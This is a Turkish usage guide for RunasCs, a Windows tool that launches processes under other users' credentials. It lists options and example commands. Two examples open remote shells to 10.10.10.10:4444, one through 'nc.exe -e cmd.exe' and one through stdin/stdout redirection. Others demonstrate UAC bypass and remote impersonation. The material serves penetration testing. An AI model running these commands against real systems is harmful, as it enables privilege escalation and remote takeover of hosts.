# RunasCs Kullanım Kılavuzu

## Giriş
RunasCs, farklı kullanıcı izinleriyle işlemleri çalıştırmak için kullanılan gelişmiş bir araçtır. Windows'un yerleşik `runas.exe` aracının yeteneklerini genişletir ve şu gibi avantajlar sunar:
- Açık kimlik bilgileriyle işlem başlatma
- UAC kısıtlamalarını aşma
- Farklı oturum türlerini destekleme (örneğin, NetworkCleartext)
- Giriş/çıkış yönlendirme (stdin, stdout, stderr) 
- Uzak kimlik doğrulama ile işlem başlatma

---

## Gereksinimler
- .NET Framework >= 2.0
- Komut satırı erişimi
- Yeterli ayrıcalıklara sahip bir kullanıcı hesabı

---

## Özellikler
- Kullanıcı adı ve şifre ile oturum açarak işlem başlatma
- UAC baypası
- NetworkCleartext gibi farklı oturum türlerini destekleme
- Uzak ana makinelere giriş/çıkış yönlendirme
- Kullanıcı profili oluşturma
- Etkileşimli olmayan arka plan işlemleri başlatma

---

## Kullanım
### Yardım Mesajını Görüntüleme
Tüm kullanılabilir komutları ve parametreleri görmek için:
```cmd
RunasCs.exe
```

### Temel Kullanım
```cmd
RunasCs.exe <username> <password> <command> [options]
```

### Opsiyonel Argümanlar
| Parametre              | Açıklama                                                                 |
|------------------------|-------------------------------------------------------------------------|
| `-d, --domain`         | Kullanıcının etki alanı. Varsayılan: ""                                |
| `-f, --function`       | Kullanılacak `CreateProcess` fonksiyonu. (0: AsUserW, 1: WithTokenW, 2: LogonW) |
| `-l, --logon-type`     | Yeni işlemin oturum türü. Varsayılan: 2 (Etkileşimli)                  |
| `-t, --timeout`        | Süreç bekleme süresi (ms). Varsayılan: 120000                         |
| `-r, --remote`         | stdin, stdout ve stderr yönlendirme için uzak ana makine ve port      |
| `-p, --force-profile`  | Kullanıcı profili oluşturma                                           |
| `-b, --bypass-uac`     | UAC baypası denemesi                                                  |
| `-i, --remote-impersonation` | Uzak bir kullanıcı adına işlem başlatma                         |

---

## Örnek Kullanımlar

### 1. Yerel Kullanıcıyla Komut Çalıştırma
```cmd
RunasCs.exe user1 password1 "cmd /c whoami /all"
```

### 2. Etki Alanı Kullanıcısıyla NetworkCleartext Oturumu
```cmd
RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
```

### 3. Arka Planda İşlem Başlatma
```cmd
RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
```

### 4. Uzak Ana Makineye Giriş/Çıkış Yönlendirme
```cmd
RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
```

### 5. UAC Baypası ile Komut Çalıştırma
```cmd
RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
```

### 6. Uzak Kimlik Doğrulama ile İşlem Başlatma
```cmd
RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

---

## Notlar
- **NetworkCleartext (8)**: UAC kısıtlamalarını aşarak geniş izinlerle işlem başlatır.
- **Arka Plan İşlemleri**: Arka planda bir süreç başlatmak için `-t 0` parametresi kullanılabilir.
- **UAC Baypası**: `--bypass-uac` bayrağı, işlem kısıtlamalarını kaldırmak için kullanılır.

---

## Kaynaklar
- [RunasCs GitHub](https://github.com/antonioCoco/RunasCs)
- [Vanara .NET Kütüphanesi](https://github.com/dahall/Vanara)

---

Bu rehber, RunasCs aracını kullanarak farklı kullanıcı izinleriyle işlem başlatma süreçlerini kapsamaktadır. Daha fazla bilgi veya yardım için yukarıdaki kaynakları ziyaret edin.
